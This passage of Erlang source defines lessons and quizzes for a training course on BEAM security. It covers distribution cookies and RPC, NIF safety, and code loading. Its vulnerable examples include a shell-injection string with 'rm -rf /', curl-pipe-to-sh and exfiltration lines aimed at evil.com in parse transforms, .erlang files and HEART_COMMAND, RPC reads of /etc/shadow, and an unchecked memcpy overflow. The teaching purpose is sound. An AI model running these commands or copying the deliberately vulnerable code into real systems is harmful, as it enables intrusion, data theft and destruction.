                            "%% Once connected, execute ANY code on ANY node:\n\n"
                            "%% Read files from the target\n"
                            "rpc:call('db@server3', file, read_file,\n"
                            "    [\"/etc/shadow\"]).\n\n"
                            "%% Execute OS commands\n"
                            "rpc:call('db@server3', os, cmd,\n"
                            "    [\"cat /var/secrets/db_password\"]).\n\n"
                            "%% Shut down the node\n"
                            "rpc:call('db@server3', init, stop, [])."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "rpc:call/4 has no restrictions on which functions can be "
                            "invoked. An attacker connected to the cluster can read files, run "
                            "shell commands, modify state, or shut down any node. There is no "
                            "built-in way to restrict which RPCs are allowed."
                        >>,
                        output => <<"{ok, <<\"root:$6$...\">>}">>
                    }
                ]
            },
            #{
                title => <<"Hidden Nodes & PID Leakage">>,
                content => <<
                    "<p><strong>Hidden nodes</strong> (started with <code>-hidden</code>) are "
                    "sometimes misunderstood as a security feature. They are not. A hidden node "
                    "has <strong>full access</strong> to the cluster; it simply does not appear "
                    "in <code>nodes()</code>. It still appears in <code>nodes(hidden)</code> and "
                    "can send messages and execute RPCs like any other node.</p>"
                    "<p><strong>PID information leakage</strong> is another subtle risk. Every PID "
                    "encodes the originating node's identity. Sending a PID across node boundaries "
                    "reveals cluster topology:</p>"
                    "<ul>"
                    "<li>PIDs contain the node name they were created on</li>"
                    "<li>Logging or exposing PIDs to external systems leaks node names and "
                    "cluster structure</li>"
                    "<li>An attacker can use this to identify high-value targets within "
                    "the cluster</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Hidden nodes are security theater">>,
                        code => <<
                            "%% Start a hidden node\n"
                            "%% $ erl -name spy@attacker -hidden "
                            "-setcookie MYSECRETCOOKIE\n\n"
                            "%% Hidden node does NOT appear in nodes()\n"
                            "%% but has full access:\n"
                            "rpc:call('app@server1', os, cmd, [\"whoami\"]).\n"
                            "%% => \"appuser\\n\"\n\n"
                            "%% Other nodes can still find hidden nodes:\n"
                            "nodes(hidden).\n"
                            "%% => ['spy@attacker']"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "Hidden nodes are a visibility feature, not a security "
                            "feature. They have the same cookie, the same trust level, and "
                            "the same unrestricted access as any other connected node."
                        >>,
                        output => <<"\"appuser\\n\"">>
                    },
                    #{
                        title => <<"PID reveals node identity">>,
                        code => <<
                            "%% PIDs encode their origin node\n"
                            "Pid = rpc:call('db@server3', erlang, self, []).\n"
                            "%% => <9876.45.0>\n\n"
                            "node(Pid).\n"
                            "%% => 'db@server3'\n\n"
                            "%% Exposing PIDs in logs or APIs leaks topology\n"
                            "io:format(\"Handler PID: ~p~n\", [self()]).\n"
                            "%% => Handler PID: <0.456.0>  (reveals node creation order)"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "PIDs contain node identity information. Exposing them in "
                            "logs, error messages, or API responses reveals internal cluster "
                            "topology to potential attackers."
                        >>,
                        output => <<"'db@server3'">>
                    }
                ]
            },
            #{
                title => <<"Hardening Distribution">>,
                content => <<
                    "<p>Securing Erlang distribution requires multiple layers:</p>"
                    "<ul>"
                    "<li><strong>TLS for distribution</strong> &mdash; use <code>-proto_dist inet_tls</code> "
                    "to encrypt all inter-node traffic, including cookie authentication</li>"
                    "<li><strong>Firewall EPMD</strong> &mdash; block port 4369 from external "
                    "access, or use <code>-start_epmd false</code> with manual port assignment</li>"
                    "<li><strong>Disable full mesh</strong> &mdash; use <code>-connect_all false</code> "
                    "to prevent automatic transitive connections</li>"
                    "<li><strong>Restrict distribution ports</strong> &mdash; use "
                    "<code>-kernel inet_dist_listen_min Port</code> and "
                    "<code>inet_dist_listen_max Port</code> to limit the port range</li>"
                    "<li><strong>Restrict RPC</strong> &mdash; implement a custom RPC server that "
                    "allowlists permitted operations instead of allowing arbitrary code execution</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"TLS distribution setup">>,
                        code => <<
                            "%% vm.args or command line:\n"
                            "%% -proto_dist inet_tls\n"
                            "%% -ssl_dist_optfile /etc/myapp/ssl_dist.conf\n\n"
                            "%% ssl_dist.conf:\n"
                            "%% [{server, [\n"
                            "%%     {certfile, \"/etc/myapp/cert.pem\"},\n"
                            "%%     {keyfile, \"/etc/myapp/key.pem\"},\n"
                            "%%     {cacertfile, \"/etc/myapp/ca.pem\"},\n"
                            "%%     {verify, verify_peer},\n"
                            "%%     {fail_if_no_peer_cert, true}\n"
                            "%% ]},\n"
                            "%% {client, [\n"
                            "%%     {certfile, \"/etc/myapp/cert.pem\"},\n"
                            "%%     {keyfile, \"/etc/myapp/key.pem\"},\n"
                            "%%     {cacertfile, \"/etc/myapp/ca.pem\"},\n"
                            "%%     {verify, verify_peer}\n"
                            "%% ]}]."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "TLS distribution encrypts all inter-node traffic and "
                            "provides mutual certificate authentication. This replaces the weak "
                            "cookie-only authentication with proper PKI-based identity verification."
                        >>,
                        output => <<"">>
                    },
                    #{
                        title => <<"Restricting ports and connectivity">>,
                        code => <<
                            "%% Restrict distribution port range\n"
                            "%% -kernel inet_dist_listen_min 9100\n"
                            "%% -kernel inet_dist_listen_max 9105\n\n"
                            "%% Disable full mesh\n"
                            "%% -connect_all false\n\n"
                            "%% Disable EPMD auto-start\n"
                            "%% -start_epmd false\n"
                            "%% -erl_epmd_port 4369\n\n"
                            "%% Firewall rules (iptables example):\n"
                            "%% iptables -A INPUT -p tcp --dport 4369\n"
                            "%%     -s 10.0.0.0/8 -j ACCEPT\n"
                            "%% iptables -A INPUT -p tcp --dport 4369\n"
                            "%%     -j DROP\n"
                            "%% iptables -A INPUT -p tcp --dport 9100:9105\n"
                            "%%     -s 10.0.0.0/8 -j ACCEPT\n"
                            "%% iptables -A INPUT -p tcp --dport 9100:9105\n"
                            "%%     -j DROP"
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Restricting ports makes firewall rules precise. Disabling "
                            "full mesh prevents transitive connections. Blocking EPMD from "
                            "external access prevents node enumeration. Combined, these measures "
                            "significantly reduce the attack surface."
                        >>,
                        output => <<"">>
                    },
                    #{
                        title => <<"Restricted RPC server">>,
                        code => <<
                            "-module(safe_rpc).\n"
                            "-export([call/4]).\n\n"
                            "-define(ALLOWED, #{\n"
                            "    {myapp_status, health, 0} => true,\n"
                            "    {myapp_metrics, get, 1} => true\n"
                            "}).\n\n"
                            "call(Node, Mod, Fun, Args) ->\n"
                            "    Key = {Mod, Fun, length(Args)},\n"
                            "    case maps:is_key(Key, ?ALLOWED) of\n"
                            "        true ->\n"
                            "            rpc:call(Node, Mod, Fun, Args);\n"
                            "        false ->\n"
                            "            {error, {rpc_denied, Key}}\n"
                            "    end."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "A custom RPC wrapper with an allowlist of permitted "
                            "module/function/arity combinations prevents arbitrary code execution. "
                            "Use this instead of exposing rpc:call/4 directly in application code."
                        >>,
                        output => <<"">>
                    }
                ]
            }
        ],
        quiz => [
            #{
                id => <<"dist_q1">>,
                type => multiple_choice,
                prompt => <<
                    "What is the primary weakness of Erlang's cookie-based "
                    "authentication?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"Cookies expire after 24 hours">>},
                    #{
                        id => <<"b">>,
                        text => <<
                            "The cookie is a plaintext shared secret with no encryption, "
                            "rotation, or per-node scoping"
                        >>
                    },
                    #{id => <<"c">>, text => <<"Cookies can only be 16 characters long">>},
                    #{id => <<"d">>, text => <<"Cookies must be numeric">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "The Erlang cookie is stored in plaintext at ~/.erlang.cookie, "
                    "shared identically across all nodes, transmitted without encryption by "
                    "default, and has no built-in rotation mechanism. Anyone who obtains the "
                    "cookie gains full cluster access."
                >>
            },
            #{
                id => <<"dist_q2">>,
                type => true_false,
                prompt => <<
                    "Starting a node with the -hidden flag prevents it from "
                    "executing RPC calls on other nodes in the cluster."
                >>,
                options => [
                    #{id => <<"true">>, text => <<"True">>},
                    #{id => <<"false">>, text => <<"False">>}
                ],
                correct => <<"false">>,
                explanation => <<
                    "Hidden nodes have full access to the cluster. The -hidden flag "
                    "only prevents the node from appearing in nodes() on other nodes. It still "
                    "appears in nodes(hidden) and can send messages, execute RPCs, and access "
                    "all resources exactly like a normal connected node."
                >>
            },
            #{
                id => <<"dist_q3">>,
                type => multiple_choice,
                prompt => <<
                    "Why is rpc:call/4 a security concern in Erlang distribution?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"It only works over unencrypted connections">>},
                    #{
                        id => <<"b">>,
                        text => <<
                            "It allows execution of any function on any connected node "
                            "with no authorization checks"
                        >>
                    },
                    #{id => <<"c">>, text => <<"It logs all calls to the console">>},
                    #{id => <<"d">>, text => <<"It is deprecated and unmaintained">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "rpc:call/4 will execute any Module:Function(Args) on the target "
                    "node without restriction. There is no built-in authorization, allowlisting, "
                    "or audit logging. An attacker connected to the cluster can read files, run "
                    "OS commands, or shut down nodes via RPC."
                >>
            },
            #{
                id => <<"dist_q4">>,
                type => multiple_choice,
                prompt => <<
                    "Which combination of measures best hardens Erlang distribution "
                    "for production?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"Use a longer cookie and hidden nodes">>},
                    #{
                        id => <<"b">>,
                        text => <<
                            "TLS distribution, firewall EPMD, -connect_all false, "
                            "and restricted RPC"
                        >>
                    },
                    #{id => <<"c">>, text => <<"Disable distribution entirely">>},
                    #{id => <<"d">>, text => <<"Run EPMD on a non-standard port">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "Defense in depth is essential: TLS encrypts traffic and provides "
                    "certificate-based authentication, firewalling EPMD prevents node enumeration, "
                    "-connect_all false prevents transitive connections, and a restricted RPC "
                    "server limits what connected nodes can execute. Each layer addresses a "
                    "different attack vector."
                >>
            }
        ]
    }.

nif_port_safety_module() ->
    #{
        id => <<"nif_port_safety">>,
        number => 8,
        title => <<"NIF & Port Safety">>,
        description => <<
            "Understand the security and stability risks of NIFs, linked-in drivers, "
            "and port programs. Learn when to use each mechanism and how to mitigate "
            "the dangers of native code running inside the BEAM VM."
        >>,
        estimated_minutes => 20,
        sections => [
            #{
                title => <<"NIFs Break All BEAM Safety Guarantees">>,
                content => <<
                    "<p>A NIF (Native Implemented Function) is C/C++ code loaded directly "
                    "into the BEAM VM's address space. Unlike Erlang code, a bug in a NIF "
                    "does <strong>not</strong> crash just the calling process &mdash; it "
                    "crashes the <strong>entire node</strong>.</p>"
                    "<p>NIFs violate every safety guarantee the BEAM normally provides:</p>"
                    "<ul>"
                    "<li><strong>Process isolation</strong> &mdash; a NIF can read/write any "
                    "process's memory</li>"
                    "<li><strong>Fault tolerance</strong> &mdash; a segfault kills all processes "
                    "on the node, not just the caller</li>"
                    "<li><strong>Memory safety</strong> &mdash; buffer overflows, use-after-free, "
                    "and null pointer dereferences are all possible</li>"
                    "<li><strong>Preemptive scheduling</strong> &mdash; a NIF that doesn't return "
                    "blocks the scheduler thread it runs on</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: NIF with buffer overflow">>,
                        code => <<
                            "/* C NIF code */\n"
                            "static ERL_NIF_TERM parse_input(\n"
                            "    ErlNifEnv* env, int argc,\n"
                            "    const ERL_NIF_TERM argv[])\n"
                            "{\n"
                            "    char buffer[256];\n"
                            "    ErlNifBinary input;\n"
                            "    enif_inspect_binary(env, argv[0], &input);\n"
                            "    /* DANGEROUS: no bounds check */\n"
                            "    memcpy(buffer, input.data, input.size);\n"
                            "    return enif_make_atom(env, \"ok\");\n"
                            "}"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "If the input binary exceeds 256 bytes, memcpy writes past "
                            "the buffer boundary. This is a classic buffer overflow that can "
                            "corrupt memory and crash the entire BEAM node, taking down every "
                            "process on it."
                        >>
                    },
                    #{
                        title => <<"Safe: Bounds-checked NIF">>,
                        code => <<
                            "static ERL_NIF_TERM parse_input(\n"
                            "    ErlNifEnv* env, int argc,\n"
                            "    const ERL_NIF_TERM argv[])\n"
                            "{\n"
                            "    ErlNifBinary input;\n"
                            "    if (!enif_inspect_binary(env, argv[0], &input))\n"
                            "        return enif_make_badarg(env);\n"
                            "    if (input.size > 256)\n"
                            "        return enif_make_badarg(env);\n"
                            "    char buffer[256];\n"
                            "    memcpy(buffer, input.data, input.size);\n"
                            "    return enif_make_atom(env, \"ok\");\n"
                            "}"
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Always validate return values from enif_* functions and "
                            "check buffer sizes before copying. Return enif_make_badarg "
                            "for invalid input rather than proceeding with unsafe operations."
                        >>
                    }
                ]
            },
            #{
                title => <<"Scheduler Starvation & Dirty Schedulers">>,
                content => <<
                    "<p>The BEAM uses a fixed number of scheduler threads (typically one "
                    "per CPU core). A normal NIF call runs on a regular scheduler and "
                    "<strong>must return within 1 millisecond</strong>. A NIF that takes "
                    "longer blocks that scheduler thread, starving all other processes "
                    "assigned to it.</p>"
                    "<p><strong>Dirty schedulers</strong> are a partial mitigation. They run "
                    "on separate thread pools so they don't block normal schedulers:</p>"
                    "<ul>"
                    "<li><code>ERL_NIF_DIRTY_JOB_CPU_BOUND</code> &mdash; for compute-heavy "
                    "work (pool size = number of schedulers)</li>"
                    "<li><code>ERL_NIF_DIRTY_JOB_IO_BOUND</code> &mdash; for I/O operations "
                    "(pool size = 10 by default)</li>"
                    "</ul>"
                    "<p>However, dirty schedulers still share the VM's address space. A crash "
                    "in a dirty NIF still kills the entire node.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Dirty scheduler NIF declaration">>,
                        code => <<
                            "static ErlNifFunc nif_funcs[] = {\n"
                            "    {\"hash_file\", 1, hash_file_nif,\n"
                            "     ERL_NIF_DIRTY_JOB_CPU_BOUND},\n"
                            "    {\"download\", 1, download_nif,\n"
                            "     ERL_NIF_DIRTY_JOB_IO_BOUND}\n"
                            "};"
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Marking NIFs as dirty prevents them from blocking "
                            "normal schedulers. CPU-bound work uses the CPU dirty pool, "
                            "I/O-bound work uses the I/O dirty pool. This keeps normal "
                            "scheduling responsive."
                        >>
                    },
                    #{
                        title => <<"Chunked work with enif_schedule_nif">>,
                        code => <<
                            "static ERL_NIF_TERM process_chunk(\n"
                            "    ErlNifEnv* env, int argc,\n"
                            "    const ERL_NIF_TERM argv[])\n"
                            "{\n"
                            "    /* Process a small chunk of work */\n"
                            "    int done = do_work_chunk();\n"
                            "    if (done)\n"
                            "        return enif_make_atom(env, \"ok\");\n"
                            "    /* Yield: reschedule to continue later */\n"
                            "    return enif_schedule_nif(\n"
                            "        env, \"process_chunk\", 0,\n"
                            "        process_chunk, argc, argv);\n"
                            "}"
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "enif_schedule_nif yields control back to the scheduler "
                            "between chunks of work. This cooperates with the BEAM's "
                            "preemptive scheduling model, preventing scheduler starvation "
                            "without needing dirty schedulers."
                        >>
                    }
                ]
            },
            #{
                title => <<"Ports vs Linked-in Drivers">>,
                content => <<
                    "<p>There are two ways to interface with external programs, each with "
                    "different safety characteristics:</p>"
                    "<ul>"
                    "<li><strong>Port programs</strong> &mdash; run as a separate OS process, "
                    "communicating via stdin/stdout. A crash in the external program does "
                    "<strong>not</strong> crash the BEAM node. The tradeoff is serialization "
                    "overhead for data crossing the process boundary.</li>"
                    "<li><strong>Linked-in drivers</strong> &mdash; loaded into the BEAM's "
                    "address space, just like NIFs. They share the same crash risk: a bug "
                    "in the driver kills the entire node. This is a legacy API largely "
                    "superseded by NIFs.</li>"
                    "</ul>"
                    "<p>For untrusted or crash-prone operations, <strong>always prefer port "
                    "programs</strong> over NIFs or linked-in drivers.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Safe: Port program with spawn_executable">>,
                        code => <<
                            "start_image_converter(InputFile) ->\n"
                            "    Port = open_port(\n"
                            "        {spawn_executable, \"/usr/bin/convert\"},\n"
                            "        [\n"
                            "            {args, [\"--\", InputFile,\n"
                            "                    \"-resize\", \"100x100\",\n"
                            "                    \"output.png\"]},\n"
                            "            exit_status,\n"
                            "            stderr_to_stdout,\n"
                            "            binary\n"
                            "        ]\n"
                            "    ),\n"
                            "    monitor(port, Port),\n"
                            "    {ok, Port}."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "spawn_executable runs the program as a separate OS process. "
                            "If convert crashes or hangs, only the port is affected. The BEAM "
                            "node stays alive. Arguments are passed directly without shell "
                            "interpretation, preventing command injection."
                        >>
                    },
                    #{
                        title => <<"Vulnerable: os:cmd/1 injection">>,
                        code => <<
                            "run_tool(UserInput) ->\n"
                            "    %% DANGEROUS: shell injection via /bin/sh\n"
                            "    os:cmd(\"tool \" ++ UserInput).\n\n"
                            "%% Attacker sends: \"; rm -rf /\"\n"
                            "%% Executed: /bin/sh -c 'tool ; rm -rf /'"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "os:cmd/1 passes the entire string to /bin/sh for "
                            "interpretation. Shell metacharacters in UserInput are executed. "
                            "Always use open_port with spawn_executable and {args, List} "
                            "to bypass the shell entirely."
                        >>
                    }
                ]
            },
            #{
                title => <<"Safe Development Practices">>,
                content => <<
                    "<p>When you must write NIFs, follow these practices to reduce risk:</p>"
                    "<ul>"
                    "<li><strong>Prefer ports over NIFs</strong> for untrusted or crash-prone "
                    "operations &mdash; isolation is worth the serialization cost</li>"
                    "<li><strong>Use dirty schedulers</strong> for any NIF that may take "
                    "longer than 1ms</li>"
                    "<li><strong>Validate all inputs</strong> in NIF code &mdash; check "
                    "enif_* return values, verify buffer sizes, validate types</li>"
                    "<li><strong>Use AddressSanitizer</strong> (<code>-fsanitize=address</code>) "
                    "during development and testing to catch memory errors</li>"
                    "<li><strong>Use enif_schedule_nif</strong> for long-running work that "
                    "can be broken into chunks</li>"
                    "<li><strong>Never trust caller data</strong> &mdash; treat every "
                    "argument from Erlang as potentially hostile</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Building NIF with AddressSanitizer">>,
                        code => <<
                            "# In Makefile or rebar.config\n"
                            "CFLAGS += -fsanitize=address -fno-omit-frame-pointer\n"
                            "LDFLAGS += -fsanitize=address\n\n"
                            "# Run tests with ASan enabled\n"
                            "# ASan will report buffer overflows, use-after-free,\n"
                            "# and other memory errors at runtime"
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "AddressSanitizer instruments your NIF code to detect "
                            "memory errors at runtime. It catches buffer overflows, "
                            "use-after-free, double-free, and memory leaks during testing "
                            "before they crash production nodes."
                        >>
                    }
                ]
            }
        ],
        quiz => [
            #{
                id => <<"nif_q1">>,
                type => multiple_choice,
                prompt => <<"What happens when a NIF has a segmentation fault?">>,
                options => [
                    #{id => <<"a">>, text => <<"Only the calling process crashes">>},
                    #{id => <<"b">>, text => <<"The scheduler thread restarts">>},
                    #{id => <<"c">>, text => <<"The entire BEAM node crashes">>},
                    #{id => <<"d">>, text => <<"The NIF is automatically unloaded">>}
                ],
                correct => <<"c">>,
                explanation => <<
                    "NIFs run inside the BEAM VM's address space. A segfault "
                    "(from buffer overflow, use-after-free, null dereference, etc.) "
                    "kills the entire OS process, terminating every Erlang process on "
                    "the node. This is fundamentally different from Erlang code, where "
                    "a crash is isolated to a single process."
                >>
            },
            #{
                id => <<"nif_q2">>,
                type => multiple_choice,
                prompt => <<
                    "How do dirty schedulers help with long-running NIF calls?"
                >>,
                options => [
                    #{
                        id => <<"a">>,
                        text => <<"They run the NIF in a separate OS process for isolation">>
                    },
                    #{
                        id => <<"b">>,
                        text =>
                            <<"They run the NIF on separate threads so normal schedulers stay free">>
                    },
                    #{
                        id => <<"c">>,
                        text => <<"They automatically break the NIF into time-sliced chunks">>
                    },
                    #{
                        id => <<"d">>,
                        text => <<"They prevent the NIF from crashing the node">>
                    }
                ],
                correct => <<"b">>,
                explanation => <<
                    "Dirty schedulers run on separate thread pools (CPU-bound and "
                    "I/O-bound) so that long-running NIFs don't block normal scheduler "
                    "threads. However, they still share the VM's address space, so a "
                    "crash in a dirty NIF still kills the entire node. They solve the "
                    "scheduling problem but not the safety problem."
                >>
            },
            #{
                id => <<"nif_q3">>,
                type => multiple_choice,
                prompt => <<
                    "Why are port programs safer than NIFs for running untrusted code?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"Port programs run faster">>},
                    #{
                        id => <<"b">>,
                        text =>
                            <<"Port programs run as separate OS processes with their own address space">>
                    },
                    #{
                        id => <<"c">>,
                        text => <<"Port programs have built-in input validation">>
                    },
                    #{
                        id => <<"d">>,
                        text => <<"Port programs use the dirty scheduler pool">>
                    }
                ],
                correct => <<"b">>,
                explanation => <<
                    "Port programs run as separate OS processes that communicate "
                    "with the BEAM via stdin/stdout. If a port program crashes, only "
                    "that external process dies &mdash; the BEAM node and all its Erlang "
                    "processes continue running. The tradeoff is serialization overhead "
                    "for data crossing the process boundary."
                >>
            },
            #{
                id => <<"nif_q4">>,
                type => true_false,
                prompt => <<
                    "Using ERL_NIF_DIRTY_JOB_CPU_BOUND protects the BEAM node "
                    "from crashes caused by memory errors in the NIF."
                >>,
                options => [
                    #{id => <<"true">>, text => <<"True">>},
                    #{id => <<"false">>, text => <<"False">>}
                ],
                correct => <<"false">>,
                explanation => <<
                    "Dirty schedulers only solve the scheduler starvation problem "
                    "by running NIFs on separate threads. They do NOT provide memory "
                    "isolation. The NIF still runs in the BEAM's address space, so a "
                    "buffer overflow or use-after-free in a dirty NIF crashes the "
                    "entire node just like a regular NIF would."
                >>
            }
        ]
    }.

code_loading_module() ->
    #{
        id => <<"code_loading">>,
        number => 9,
        title => <<"Code Loading & Module Integrity">>,
        description => <<
            "Explore the BEAM VM's trust-the-compiler model for code loading, "
            "the absence of bytecode verification, and how attackers can exploit "
            "hot code loading, parse transforms, startup files, and boot scripts."
        >>,
        estimated_minutes => 25,
        sections => [
            #{
                title => <<"No Bytecode or File Integrity Verification">>,
                content => <<
                    "<p>Unlike the JVM, the BEAM VM performs <strong>no verification "
                    "pass</strong> on loaded bytecode. There are no checks for stack depth, "
                    "type safety, or control flow integrity. The VM operates on a "
                    "<strong>trust-the-compiler</strong> model &mdash; it assumes the "
                    "bytecode was produced by a correct compiler.</p>"
                    "<p>BEAM files also lack any integrity verification. There are no "
                    "checksums, digital signatures, or cryptographic authentication. Anyone "
                    "who can write to a directory on the code path can silently replace "
                    "modules.</p>"
                    "<ul>"
                    "<li><code>code:load_binary/3</code> accepts any binary without "
                    "verification &mdash; arbitrary BEAM bytecode can be loaded at runtime</li>"
                    "<li>The BEAM file loader is written in C, making it susceptible to "
                    "classic C vulnerabilities (buffer overflows, integer overflows) when "
                    "parsing malformed files</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: Loading unverified BEAM bytecode">>,
                        code => <<
                            "%% DANGEROUS: loads any binary as a module\n"
                            "{ok, Bytecode} = file:read_file(\"/tmp/evil.beam\"),\n"
                            "code:load_binary(my_module, \"my_module.beam\", Bytecode).\n\n"
                            "%% The VM trusts this bytecode completely.\n"
                            "%% No checksums, no signatures, no verification.\n"
                            "%% The attacker's code now runs as my_module."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "code:load_binary/3 loads arbitrary bytecode with zero "
                            "verification. An attacker who can supply a BEAM binary can "
                            "replace any module in the running system."
                        >>
                    },
                    #{
                        title => <<"Weak debug info encryption">>,
                        code => <<
                            "%% .erlang.crypt file format (plaintext keys!):\n"
                            "[{debug_info, des3_cbc, [], \"my_secret_key\"}].\n\n"
                            "%% Only encrypts the debug_info chunk.\n"
                            "%% The actual bytecode is NOT encrypted.\n"
                            "%% Uses DES3 + MD5 key derivation (weak by modern standards)."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "Debug info encryption uses DES3 with MD5 key derivation "
                            "and stores keys in plaintext .erlang.crypt files. Only the "
                            "debug_info chunk is encrypted; the executable bytecode remains "
                            "in the clear."
                        >>
                    }
                ]
            },
            #{
                title => <<"Hot Code Loading Dangers">>,
                content => <<
                    "<p>Erlang's hot code loading is a powerful feature, but it introduces "
                    "a subtle attack vector. The BEAM keeps at most <strong>two versions</strong> "
                    "of a module loaded simultaneously (current and old). When a "
                    "<strong>third version</strong> is loaded:</p>"
                    "<ul>"
                    "<li>All processes still running code from the <strong>first "
                    "version are killed</strong></li>"
                    "<li>This can be weaponized to crash targeted processes by repeatedly "
                    "loading new versions of their module</li>"
                    "<li>An attacker with code loading access can cause selective denial "
                    "of service</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Weaponized hot code loading">>,
                        code => <<
                            "%% A long-running process uses module 'worker'.\n"
                            "%% Attacker loads worker.beam twice rapidly:\n\n"
                            "%% Load #1: current version becomes 'old'\n"
                            "code:load_file(worker),\n\n"
                            "%% Load #2: 'old' is purged, processes running\n"
                            "%% the original version are KILLED\n"
                            "code:load_file(worker).\n\n"
                            "%% All processes stuck in the first version\n"
                            "%% are terminated by the VM."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "Two rapid code loads force a purge of the oldest version. "
                            "Any process executing a function from that version is killed "
                            "by the VM. This can target critical long-running processes."
                        >>
                    }
                ]
            },
            #{
                title => <<"Compile-Time and Startup Attacks">>,
                content => <<
                    "<p>Several mechanisms allow code execution before your application "
                    "even starts handling requests:</p>"
                    "<ul>"
                    "<li><strong>Parse transforms</strong> run arbitrary Erlang code at "
                    "compile time. A malicious dependency with a parse transform achieves "
                    "RCE during <code>rebar3 compile</code></li>"
                    "<li><strong><code>.erlang</code> startup files</strong> execute "
                    "arbitrary code when the Erlang shell starts. Placing one in a project "
                    "directory or the user's home directory runs code automatically</li>"
                    "<li><strong><code>HEART_COMMAND</code></strong> environment variable "
                    "controls the command executed when the heart process restarts a node "
                    "&mdash; injecting this variable means arbitrary execution on restart</li>"
                    "<li><strong>Boot script tampering</strong>: modified <code>.boot</code> "
                    "or <code>.script</code> files control the code loading order at startup, "
                    "allowing an attacker to load malicious modules first</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Malicious parse transform (compile-time RCE)">>,
                        code => <<
                            "%% In a dependency's src/evil_transform.erl:\n"
                            "-module(evil_transform).\n"
                            "-export([parse_transform/2]).\n\n"
                            "parse_transform(Forms, _Options) ->\n"
                            "    %% This runs during compilation!\n"
                            "    os:cmd(\"curl http://evil.com/payload | sh\"),\n"
                            "    Forms.  %% Return forms unchanged, no trace\n\n"
                            "%% Triggered by: -compile({parse_transform, evil_transform})."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "Parse transforms execute arbitrary code at compile time. "
                            "A dependency can include one that runs silently during "
                            "rebar3 compile, exfiltrating data or installing backdoors "
                            "with no runtime trace."
                        >>
                    },
                    #{
                        title => <<"Dangerous .erlang and HEART_COMMAND">>,
                        code => <<
                            "%% .erlang file in project root or ~/ :\n"
                            "os:cmd(\"curl http://evil.com/exfil?data=\" ++\n"
                            "    os:cmd(\"whoami\")).\n\n"
                            "%% HEART_COMMAND injection:\n"
                            "%% export HEART_COMMAND=\"curl http://evil.com/pwn | sh\"\n"
                            "%% When the node crashes and heart restarts it,\n"
                            "%% the attacker's command runs instead."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "The .erlang file runs automatically on shell startup. "
                            "HEART_COMMAND controls the restart command for the heart "
                            "process. Both allow arbitrary code execution without "
                            "modifying any application code."
                        >>
                    }
                ]
            },
            #{
                title => <<"Safe Patterns">>,
                content => <<
                    "<p>Mitigating code loading attacks requires defense in depth:</p>"
                    "<ul>"
                    "<li><strong>Verify BEAM file checksums</strong> before loading &mdash; "
                    "compute and compare SHA-256 hashes of .beam files against known-good "
                    "values</li>"
                    "<li><strong>Restrict the code path</strong> &mdash; use "
                    "<code>code:set_path/1</code> to limit where modules can be loaded from, "
                    "and ensure those directories have strict file permissions</li>"
                    "<li><strong>Use releases with signed packages</strong> &mdash; OTP "
                    "releases bundle all code; combine with package signing in your CI/CD</li>"
                    "<li><strong>Audit parse transforms in dependencies</strong> &mdash; "
                    "search for <code>parse_transform</code> in all deps before compiling</li>"
                    "<li><strong>Disable .erlang in production</strong> &mdash; start the "
                    "VM with <code>-user undefined</code> or ensure no .erlang file exists "
                    "in the working directory or home directory</li>"
                    "<li><strong>Protect HEART_COMMAND</strong> &mdash; sanitize the "
                    "environment before starting the VM, or avoid using heart in "
                    "container deployments</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Verifying BEAM file integrity before loading">>,
                        code => <<
                            "load_verified(Module, ExpectedHash) ->\n"
                            "    Path = code:which(Module),\n"
                            "    {ok, Bytecode} = file:read_file(Path),\n"
                            "    Hash = crypto:hash(sha256, Bytecode),\n"
                            "    case Hash =:= ExpectedHash of\n"
                            "        true ->\n"
                            "            code:load_binary(Module, Path, Bytecode);\n"
                            "        false ->\n"
                            "            logger:error(\"BEAM integrity check failed: ~s\",\n"
                            "                         [Path]),\n"
                            "            {error, integrity_check_failed}\n"
                            "    end."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Computing a SHA-256 hash of the BEAM file and comparing "
                            "it against a known-good value catches tampering. This should "
                            "be done before any call to code:load_binary/3."
                        >>
                    },
                    #{
                        title => <<"Auditing dependencies for parse transforms">>,
                        code => <<
                            "%% In your CI pipeline or a rebar3 plugin:\n"
                            "audit_parse_transforms(DepDir) ->\n"
                            "    Files = filelib:wildcard(DepDir ++ \"/**/*.erl\"),\n"
                            "    [F || F <- Files,\n"
                            "          has_parse_transform(F)].\n\n"
                            "has_parse_transform(File) ->\n"
                            "    {ok, Bin} = file:read_file(File),\n"
                            "    binary:match(Bin, <<\"parse_transform\">>) =/= nomatch."
                        >>,
                        vulnerable => false,
                        explanation => <<
